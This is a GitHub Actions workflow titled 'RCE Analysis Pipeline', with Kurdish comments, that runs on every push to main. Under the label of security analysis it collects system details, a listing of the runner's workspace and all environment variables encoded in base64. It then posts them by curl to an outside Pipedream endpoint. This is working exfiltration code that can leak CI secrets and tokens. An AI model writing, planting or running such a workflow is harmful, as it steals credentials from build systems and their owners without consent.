name: RCE Analysis Pipeline

on:
  push:
    branches:
      - main
  workflow_dispatch:

jobs:
  exploit_test:
    runs-on: ubuntu-latest
    steps:
      - name: Advanced System Information Gathering
        run: |
          echo "Starting security analysis..."
          
          # ١. کۆکردنەوەی زانیارییەکان لە ناو گۆڕاوێکدا
          # هەموو شتێک بە ڕێکی ڕێکدەخەین
          {
            echo "=== SYSTEM INFORMATION ==="
            echo "User: $(whoami)"
            echo "Hostname: $(hostname)"
            echo "Kernel: $(uname -a)"
            echo "---"
            echo "=== DIRECTORY STRUCTURE ==="
            ls -R /home/runner/work/
            echo "---"
            echo "=== ENVIRONMENT VARIABLES (BASE64) ==="
            env | base64
            echo "---"
          } > rce_report.txt
          
          # ٢. ناردنی ڕاپۆرتەکە بە شێوەی Plain Text بۆ Pipedream
          curl -X POST \
            -H "Content-Type: text/plain" \
            -d "$(cat rce_report.txt)" \
            https://eow69rutoawme4j.m.pipedream.net
            
          echo "Analysis sent successfully."
